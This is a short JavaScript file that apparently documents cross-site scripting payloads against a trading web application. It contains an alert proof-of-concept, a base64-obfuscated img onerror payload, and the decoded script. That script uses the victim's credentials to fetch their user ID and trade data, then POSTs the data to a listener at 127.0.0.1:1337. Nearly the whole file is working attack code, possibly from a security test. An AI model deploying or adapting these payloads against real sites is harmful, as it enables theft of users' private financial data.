/* Injections 

Alert: 
<img src onerror=alert(1)>

Full Exploit (sends to localhost:1337):
<img src onerror=eval(atob('Y29uc3QgZ2V0VXNlcklkID0gYXN5bmMoKSA9PiB7CiAgY29uc3QgciA9IGF3YWl0IGZldGNoKCcvYXBpL3VzZXJzL3VzZXJJZCcsIHtjcmVkZW50aWFsczogJ2luY2x1ZGUnfSkudGhlbihyZXNwb25zZSA9PiB7CiAgICBpZihyZXNwb25zZS5vaykgewogICAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpCiAgICB9IGVsc2UgewogICAgICB0aHJvdyBFcnJvcihgW1hTU10gVW5hYmxlIHRvIGdldCB1c2VycyBJZGApIAogICAgfQogIH0pLmNhdGNoKGUgPT4gewogICAgY29uc29sZS5lcnJvcihlKQogIH0pCiAgY29uc29sZS5sb2cocikKICByZXR1cm4gci51c2VyX2lkCn0KCmNvbnN0IGdldFRyYWRlcyA9IGFzeW5jKCkgPT4gewogIGNvbnN0IHVzZXJfaWQgPSBhd2FpdCBnZXRVc2VySWQoKQogIGZldGNoKGAvYXBpL3RyYWRlcy8ke3VzZXJfaWR9YCwgewogICAgImNyZWRlbnRpYWxzIjogImluY2x1ZGUiCiAgfSkudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpLnRoZW4oZGF0YSA9PiB7CiAgICAgIGNvbnNvbGUubG9nKCdbWFNTXSBIYWNrZWQgPQgnICsgZGF0YSkKICAgICAgZmV0Y2goJ2h0dHA6Ly8xMjcuMC4wLjE6MTMzNycsIHsKICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgICAgYm9keTogZGF0YQogICAgICB9KQogIH0pOwp9CgpnZXRUcmFkZXMoKQ=='))>
*/

// Simplified exploit example - Get trade data for current user and exfils
const getUserId = async() => {
  const r = await fetch('/api/users/userId', {credentials: 'include'}).then(response => {
    if(response.ok) {
      return response.json()
    } else {
      throw Error(`[XSS] Unable to get users Id`) 
    }
  }).catch(e => {
    console.error(e)
  })
  console.log(r)
  return r.user_id
}

const getTrades = async() => {
  const user_id = await getUserId()
  fetch(`/api/trades/${user_id}`, {
    "credentials": "include"
  }).then(response => response.text()).then(data => {
      console.log('[XSS] Hacked ðŸ˜ˆ' + data)
      fetch('http://127.0.0.1:1337', {
          method: 'POST',
          body: data
      })
  });
}

getTrades()